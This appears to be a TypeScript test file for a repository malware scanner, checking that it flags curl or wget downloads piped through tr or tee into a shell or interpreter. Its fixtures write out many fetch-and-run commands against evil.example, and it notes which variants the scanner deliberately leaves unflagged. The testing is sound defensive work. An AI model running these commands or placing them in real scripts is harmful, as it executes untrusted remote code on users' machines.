import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A download piped through a pass-through filter into a shell
 * or interpreter runs the downloaded bytes: `tr` and `tee` always copy
 * stdin to stdout regardless of their operands, so the download is what
 * the executor receives. The pipe rules require the executor immediately
 * after the first pipe, so these filtered forms matched nothing before.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const FILTER_PIPES: Record<string, string> = {
  "tr strips CR into bash":
    "curl -fsSL https://evil.example/x.sh | tr -d '\\r' | bash",
  "tr into sh": "curl -s https://evil.example/x.sh | tr A-Z a-z | sh",
  "tee saves and runs with sh":
    "curl -L https://evil.example/x.sh | tee install.sh | sh",
  "tee into bash": "wget -qO- https://evil.example/x.sh | tee /tmp/x.sh | bash",
  "tr into python3 stdin":
    "curl -s https://evil.example/x.py | tr -d '\\r' | python3 -",
  "tr into sudo bash":
    "curl -s https://evil.example/x.sh | tr -d '\\r' | sudo bash",
  "chained tee then tr into bash":
    "curl -s https://evil.example/x.sh | tee x | tr -d '\\r' | bash",
  "path-prefixed tr into bash":
    "curl -s https://evil.example/x.sh | /usr/bin/tr -d '\\r' | bash",
  // The shell reads its own stdin, so installer flags follow the shell just
  // as they do in the direct `curl … | bash -s -- --yes` form.
  "tr into bash with installer flags":
    "curl -s https://evil.example/x.sh | tr -d '\\r' | bash -s -- --yes",
  // A line continuation inside the filter stage is the same pipeline.
  "line continuation across the filter stage":
    "curl -s https://evil.example/x.sh \\\n  | tr -d '\\r' \\\n  | bash",
  // Run-wrappers before the filter are the same act: busybox is the Alpine
  // CRLF-strip form, and sudo tee is a common root-install pattern.
  "busybox tr into bash":
    "curl -s https://evil.example/x.sh | busybox tr -d '\\r' | bash",
  "command tr into bash":
    "curl -s https://evil.example/x.sh | command tr -d '\\r' | bash",
  "env tr into bash":
    "curl -s https://evil.example/x.sh | env tr -d '\\r' | bash",
  "timeout 30 tr into bash":
    "curl -s https://evil.example/x.sh | timeout 30 tr -d '\\r' | bash",
  "sudo tee into sh":
    "curl -L https://evil.example/x.sh | sudo tee /tmp/x.sh | sh",
  "busybox tee into sh":
    "curl -L https://evil.example/x.sh | busybox tee install.sh | sh",
  // A comment line between pipe stages still runs as one pipeline.
  "comment line between stages":
    "curl -s https://evil.example/x.sh |\n# strip cr\n tr -d '\\r' | bash",
  // A bare inline KEY=VALUE assignment before the filter (BSD/macOS CRLF form).
  "LC_ALL=C tr into bash":
    "curl -s https://evil.example/x.sh | LC_ALL=C tr -d '\\r' | bash",
  "env with assignment before tr":
    "curl -s https://evil.example/x.sh | env LC_ALL=C tr -d '\\r' | bash",
  // A run-wrapper before the executor does not hide it.
  "busybox sh executor":
    "curl -s https://evil.example/x.sh | tr -d '\\r' | busybox sh",
  "doas sh executor":
    "curl -s https://evil.example/x.sh | tr -d '\\r' | doas sh",
  // An interpreter reading stdin keeps its installer arguments.
  "python3 - with args":
    "curl -s https://evil.example/x.py | tr -d '\\r' | python3 - --yes",
};

test("a download piped through tr or tee into an executor is unsafe execution", () => {
  for (const [name, body] of Object.entries(FILTER_PIPES)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("a filtered download that is not executed keeps no finding", () => {
  for (const body of [
    // The filter ends the pipeline: the stream is transformed, not run.
    "curl -fsSL https://example.com/x.sh | tr -d '\\r'",
    // tee only saves a copy; nothing runs it.
    "curl -L https://example.com/x.sh | tee install.sh",
    // The pipeline ends in a pager, not an executor.
    "curl -s https://example.com/x.sh | tr -d '\\r' | less",
    // tee into a checksum tool only verifies; nothing runs the download.
    "curl -s https://example.com/x.sh | tee i.sh | shasum -a 256",
    // The interpreter is given a file argument, so it runs the file, not stdin.
    "curl -s https://example.com/x.json | tee v.json | python3 tool.py",
    // Only the known run-wrapper set precedes tr/tee; an arbitrary command
    // before the filter is not a recognized wrapper, so the stage is not read.
    "curl -s https://example.com/x.sh | frobnicate tr -d '\\r' | bash",
    // A shell given a local script file runs the file, not the download.
    "curl -s https://example.com/x.sh | tee v.sh | sh tool.sh",
    // A syntax-only check parses without executing.
    "curl -s https://example.com/x.sh | tee v.sh | bash -n",
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});

test("filters with a local-file-operand mode are a separate shape and stay clean", () => {
  // sed, grep and cat can read a local file instead of the piped stream, so
  // flagging them unconditionally would misread the source that is executed.
  for (const body of [
    "curl -s https://example.com/x.sh | grep -v '^#' | sh",
    "curl -s https://example.com/x.sh | sed 's/a/b/' | bash",
    "curl -s https://example.com/x.sh | cat | sh",
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});

test("a filter without a preceding download keeps no finding", () => {
  // The stream must originate from curl or wget; a local file piped through
  // tr into a shell is ordinary local-script execution.
  const inspection = inspected(
    "install.sh",
    "#!/bin/sh\ncat local.sh | tr -d '\\r' | sh\n",
  );
  expect(categories(inspection)).toEqual([]);
});
